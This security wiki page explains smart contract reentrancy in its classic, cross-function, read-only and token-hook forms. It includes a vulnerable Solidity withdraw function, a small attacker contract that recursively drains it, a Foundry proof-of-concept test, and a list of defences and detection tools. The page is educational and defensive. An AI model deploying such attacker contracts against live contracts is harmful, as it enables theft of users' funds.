---
title: Reentrancy
slug: reentrancy
---

> **TL;DR:** A contract makes an external call before updating its own state; the callee calls back in and re-runs the function against stale state, draining funds. The DAO-era root cause, still being found in 2024-2025 (read-only and cross-function variants).

## What it is
Reentrancy is a control-flow vulnerability where a contract's external call hands execution to attacker-controlled code, which calls back into the original (or a sibling) function before the original function has finished updating state. Because the "you already withdrew" flag hasn't been written yet, the withdraw succeeds again — recursively until the contract is empty.

## Preconditions / where it applies
- A function performs an external call (`call`, `transfer`, ERC-20 `transfer` to a hook-supporting token, ERC-721/1155 `safeTransfer*`, ERC-777 send hook)
- State write (balance decrement, claimed flag, NFT-burned flag) happens *after* the external call
- No re-entrancy guard / mutex
- For read-only reentrancy: a view function reads state mid-flight (between external call and state write) and another protocol trusts that view

## Technique
**Classic single-function reentrancy.**
```solidity
function withdraw() external {
    uint256 bal = balances[msg.sender];
    (bool ok,) = msg.sender.call{value: bal}("");   // hands over execution
    require(ok);
    balances[msg.sender] = 0;                       // too late
}
```
Attacker contract:
```solidity
receive() external payable {
    if (address(victim).balance >= 1 ether) victim.withdraw();
}
function pwn() external payable {
    victim.deposit{value: 1 ether}();
    victim.withdraw();
}
```

**Cross-function reentrancy.** `withdraw` and `transfer` share `balances`. Attacker enters `transfer` from inside `withdraw`'s callback and moves balance to a second EOA before the decrement lands.

**Read-only reentrancy.** A lending protocol reads the LP-token price from a victim AMM mid-callback. Curve / Balancer-style pools were exploited this way (e.g. Curve July 2023 vyper compiler bug — different root, same shape). External integrators see a temporarily wrong price and let attacker borrow against it.

**ERC-777 / ERC-1363 / ERC-721 `onERC721Received` hooks.** These give the receiver a callback on transfer — turning "boring" ERC-20-looking flows into re-entrancy primitives.

PoC scaffold (Foundry):
```solidity
function testReenter() public {
    vm.deal(address(this), 1 ether);
    victim.deposit{value: 1 ether}();
    victim.withdraw();
    assertGt(address(this).balance, 1 ether);
}
```

## Detection and defence
- Apply **Checks-Effects-Interactions**: validate, mutate state, then call out.
- Use OpenZeppelin `ReentrancyGuard` (`nonReentrant` modifier) on any function with an external call, including view callers in cross-contract critical paths.
- Prefer `transfer`/`call` after state updates; for ERC-777 awareness, treat any unknown token as hook-capable.
- For read-only reentrancy: lock view functions too (`nonReentrantView`) or read TWAPs / cached values.
- Tools: Slither detectors `reentrancy-eth`, `reentrancy-no-eth`, `reentrancy-benign`, `reentrancy-events`; Foundry invariant tests; Echidna properties.

Related: [[access-control-bugs]], [[airdrop-abuse]], [[smart-contracts-overview]].

## References
- [SWC-107 Reentrancy](https://swcregistry.io/docs/SWC-107) — registry entry
- [OpenZeppelin ReentrancyGuard](https://docs.openzeppelin.com/contracts/5.x/api/utils#ReentrancyGuard) — canonical mutex
- [ChainSecurity — read-only reentrancy](https://chainsecurity.com/heartbreaks-curve-lp-oracles/) — Curve LP oracle case
- [Consensys Diligence — reentrancy patterns](https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/) — patterns + mitigations
